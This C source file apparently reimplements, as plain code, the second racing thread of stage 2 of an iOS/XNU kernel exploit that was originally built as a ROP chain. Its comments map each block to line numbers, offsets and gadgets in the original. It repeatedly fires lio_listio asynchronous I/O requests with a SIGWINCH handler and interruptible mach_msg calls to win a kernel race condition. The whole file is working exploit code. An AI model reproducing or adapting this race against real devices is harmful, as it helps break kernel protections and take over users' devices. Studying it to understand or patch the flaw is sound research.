#include <mach/mach.h>
#include <aio.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <signal.h>

extern int __pthread_sigmask(int, const sigset_t *, sigset_t *);
extern int __sigaction(int signum, const struct sigaction *act, struct sigaction *oldact);
extern mach_port_t mach_reply_port();

void simple_ret() {}
int main() {
	// vars which are global/defined in thread 1
	#define NENT 1
	uint64_t should_race = 0; // this will be set to a none zero value by thread one once the race was wone

	// implementation of the second thread of stage 2
	// lines 1175 - 1200 are just setup code
	
	// line 1202-1204
	char * racer_path = "/private/var/log/racoon.log";

	// line 1207-1210
	int racer_fd = open(racer_path, O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);

	// line 1212-1214
	struct aiocb ** aio_list = malloc(NENT * 8);
	struct aiocb * aios = malloc(NENT * sizeof(struct aiocb));
	char * aio_buf = malloc(NENT);

	// the next five blocks setup a signal handler so that we can catch the signal issued by the lio_list call

	// line 1216-1218
	// name changed from the rop variable sigevent to my_sigevent
	// and ofc that would all be heap based and is stack based now
	struct sigevent my_sigevent;
	memset(&my_sigevent,0,sizeof(struct sigevent)); // this is already done by the framework in rop but we add it here cause we allocate on the stack
	my_sigevent.sigev_notify = SIGEV_SIGNAL;
	my_sigevent.sigev_signo = SIGWINCH;

	// line 1220-1223
	sigset_t signal_set;
	sigemptyset(&signal_set);

	// line 1225-1227
	sigaddset(&signal_set, SIGWINCH);

	// line 1229-1231
	__pthread_sigmask(SIG_UNBLOCK, &signal_set,NULL);

	// line 1233-1241
	// the method to get a sa_handler and sa_tramp are changed but they end up doing the same thing
	struct __sigaction * myaction = malloc(sizeof(struct __sigaction));
    memset(myaction,0,sizeof(struct __sigaction));
    myaction->sa_handler = simple_ret; // in rop we use a simple ret gadget: (void (*)(int)) offsets->rop_nop-0x180000000+offsets->new_cache_addr;
    myaction->sa_tramp = dlsym(RTLD_DEFAULT,"_sigtramp"); // in rop we need to get that using special methods: (void (*)(void *, int, int, siginfo_t *, void *)) get_addr_from_name(offsets,"_sigtramp")-0x180000000+offsets->new_cache_addr;
    myaction->sa_mask = (1 << (SIGWINCH-1));
	__sigaction(SIGWINCH,myaction,NULL);

	// line 1244-1256
	for (uint32_t i = 0; i < NENT; i++) {
		struct aiocb * current_struct = aios + sizeof(struct aiocb) * i;
		current_struct->aio_fildes = racer_fd;
		current_struct->aio_offset = 0;
		current_struct->aio_buf = aio_buf + i;
		current_struct->aio_nbytes = 1;
		current_struct->aio_lio_opcode = LIO_READ;
		current_struct->aio_sigevent.sigev_notify = SIGEV_NONE;
		aio_list[i] = current_struct;
	}

	// line 1259 - 1285
	// the while (should_race == 0) part is implemented in line 1281 - 1285
	do {
		// line 1261-1264
		lio_listio(LIO_NOWAIT,aio_list,NENT,&my_sigevent);

		// line 1266-1268
		mach_msg(0,MACH_RCV_MSG | MACH_RCV_INTERRUPT | MACH_RCV_TIMEOUT,0,0,mach_reply_port(), 1, MACH_PORT_NULL);

		// line 1275-1279
		for (int i = 0; i < NENT; i++) {
			aio_return(aio_list[i]);
		}

	} while (should_race == 0); // yes I know why the hell do I check if should_race is false, I only have a cbnz in rop which breaks out of the loop that's why

	// we don't care about this part of thread 2 because we will never reach it in this implementation, but basically it's an endless loop with long sleeps

}
